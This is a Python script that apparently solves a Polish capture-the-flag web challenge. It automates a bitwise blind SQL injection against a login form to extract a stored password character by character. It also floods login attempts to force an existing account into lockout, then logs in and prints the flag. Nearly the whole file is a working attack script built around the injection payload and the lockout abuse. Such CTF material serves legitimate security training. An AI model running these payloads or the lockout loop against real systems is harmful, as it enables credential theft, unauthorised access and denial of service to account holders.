import requests, string, random, sys


def drain_login_limit(username):
    """Tries login with dumy data to make registration with new account possible."""
    r = requests.post(url, data={'email': username, 'pass': "letmein!", "action": "Zaloguj się"})
    while not "Konto zostało zablokowane" in r.text:
        r = requests.post(url, data={'email': username, 'pass': "letmein!", "action": "Zaloguj się"})
        sys.stdout.write("\rdraining login attempts for old account...")
        sys.stdout.write('\033[2K\033[1G')


def detect_account(r):
    user_name = ""
    i = 167
    while r.text[i] != "<":
        user_name += r.text[i]
        i += 1
    return user_name


# generate account
position = 1
password = ""
character = 0
generated_username = ''.join(random.choice(string.ascii_letters) for i in range(10))
url = "http://tasks.ctfd.kncyber.pl:7017/"
print("[+] process started")
r = requests.post(url, data={'email': generated_username, "action": "Zarejestruj się"})
if "Tylko jeden aktywny użytkownik" in r.text:
    print("[!] For this IP address user", detect_account(r), "is already registered")
    drain_login_limit(detect_account(r))
    r = requests.post(url, data={'email': generated_username, "action": "Zarejestruj się"})
    if "zostało zarejestrowane. Hasło zostało wysłane na Twój email." in r.text:
        print("[+] Account " + generated_username + " registered")
if "zostało zarejestrowane. Hasło zostało wysłane na Twój email." in r.text:
    print("[+] Account " + generated_username + " registered")

i = 1
while len(password) < 44:
    while i <= 64:
        r = requests.post(url, data={'email': generated_username,
                                     'pass': "' OR ASCII(SUBSTR((SELECT pass FROM users WHERE email ='" + generated_username + "')," + str(
                                         position) + ",1)) & BINARY '" + str(i) + "' -- ", "action": "Zaloguj się"})
        if "Witaj, " in r.text:
            character |= i
        i <<= 1
    position += 1
    password += chr(character)
    progress = int(100 * position / 45)
    sys.stdout.write('\033[2K\033[1G')
    sys.stdout.write("\rpassword progress " + str(progress) + "%, now: " + password)
    i = 1
    character = 0
print("\n[+] password to", generated_username, "account:", password)

r = requests.post(url, data={'email': generated_username, 'pass': password, "action": "Zaloguj się"})
print("[!] FLAG:", r.text[219:268])
